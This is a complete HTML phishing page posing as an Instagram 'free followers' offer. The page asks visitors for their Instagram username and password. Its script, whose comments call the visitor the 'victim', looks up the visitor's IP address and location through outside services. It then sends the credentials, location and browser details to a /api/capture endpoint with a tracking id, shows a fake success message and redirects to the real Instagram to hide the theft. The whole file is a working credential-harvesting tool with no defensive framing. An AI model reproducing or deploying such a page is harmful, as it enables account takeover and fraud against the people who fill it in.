<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Followers</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px; max-width: 400px; width: 100%; text-align: center; }
        h1 { color: #262626; font-size: 24px; margin-bottom: 8px; }
        p { color: #8e8e8e; font-size: 14px; margin-bottom: 24px; }
        .logo { width: 180px; margin-bottom: 24px; }
        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; font-size: 14px; }
        button { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
        button:hover { background: #1877f2; }
        .error { color: #ed4956; font-size: 12px; margin-top: 8px; display: none; }
        .loading { display: none; margin-top: 16px; color: #8e8e8e; font-size: 14px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
        <text x="20" y="45" font-family="Arial" font-size="45" font-weight="bold" fill="#262626">Instagram</text>
    </svg>
    <h1>Get Free Followers</h1>
    <p>Enter your Instagram credentials to get 10,000 free followers instantly!</p>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Instagram Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Get Followers</button>
        <div class="error" id="error">Invalid credentials. Please try again.</div>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            Verifying credentials...
        </div>
    </form>
</div>

<script>
// URL se uid parameter nikaalo
function getUrlParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name) || '';
}

// Victim ka IP detect karo (client-side)
async function getClientInfo() {
    let ip = 'N/A', city = 'N/A', country = 'N/A', isp = 'N/A';
    try {
        // ipapi.co free service
        const resp = await fetch('https://ipapi.co/json/');
        const data = await resp.json();
        ip = data.ip || ip;
        city = data.city || city;
        country = data.country_name || country;
        isp = data.org || isp;
    } catch (e) {
        // Fallback: ipify
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            ip = data.ip || ip;
        } catch (e2) {}
    }
    return { ip, city, country, isp };
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorEl = document.getElementById('error');
    const loadingEl = document.getElementById('loading');
    const submitBtn = this.querySelector('button');
    
    // Simple validation
    if (!username || !password) {
        errorEl.style.display = 'block';
        errorEl.textContent = 'Please fill in all fields.';
        return;
    }
    
    errorEl.style.display = 'none';
    loadingEl.style.display = 'block';
    submitBtn.disabled = true;
    submitBtn.textContent = 'Please wait...';
    
    // Get client info
    const clientInfo = await getClientInfo();
    const uid = getUrlParam('uid');
    
    // Send data to API
    try {
        const response = await fetch('/api/capture' + (uid ? '?uid=' + uid : ''), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: username,
                password: password,
                ip: clientInfo.ip,
                city: clientInfo.city,
                country: clientInfo.country,
                isp: clientInfo.isp,
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            })
        });
        
        if (response.ok) {
            loadingEl.innerHTML = '<div style="color: #00c853; font-size: 16px;">✅ Followers will be added within 24 hours! Check your Instagram.</div>';
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 3000);
        } else {
            errorEl.textContent = 'Service unavailable. Try again later.';
            errorEl.style.display = 'block';
        }
    } catch (err) {
        errorEl.textContent = 'Connection error. Please try again.';
        errorEl.style.display = 'block';
    }
    
    loadingEl.style.display = 'none';
    submitBtn.disabled = false;
    submitBtn.textContent = 'Get Followers';
});
</script>
</body>
</html>
